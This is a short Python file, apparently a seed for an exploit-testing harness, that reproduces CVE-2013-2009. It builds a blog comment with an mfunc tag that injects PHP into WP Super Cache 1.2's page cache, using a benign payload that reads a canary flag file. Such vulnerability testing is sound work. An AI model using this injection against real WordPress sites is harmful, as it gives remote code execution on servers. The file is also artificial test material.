# [GIVEN] CVE-2013-2009 seed: the original WP Super Cache mfunc PHP-code-injection vector.
#
# An unauthenticated visitor posts a SINGLE blog comment whose body carries a complete
# <!--mfunc PAYLOAD-->...<!--/mfunc--> tag. WP core leaves HTML comments intact, so on V0
# (WP Super Cache 1.2, which has no comment guard) the tag reaches the cache generator and is
# converted into executable PHP baked into the page cache file -> the benign canary reader runs
# and the flag is exfiltrated. On V1 (1.3.1) the CVE-2013-2009 guard no_mfunc_in_comments() zaps
# any single comment that contains BOTH the opening and the closing mfunc tag -> BLOCKED (no flag).
#
# The PAYLOAD is a fixed, benign server-side reader (echo the planted canary file). candidate
# schema: {"mode","comments"} consumed by oracle.run_probe.

PAYLOAD = "echo @file_get_contents('/flag/pcb_flag.txt');"


def candidate():
    return {
        "mode": "single_comment_mfunc",   # CVE-2013-2009 seed
        "comments": [
            "<!--mfunc " + PAYLOAD + "-->x<!--/mfunc-->",
        ],
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate()))
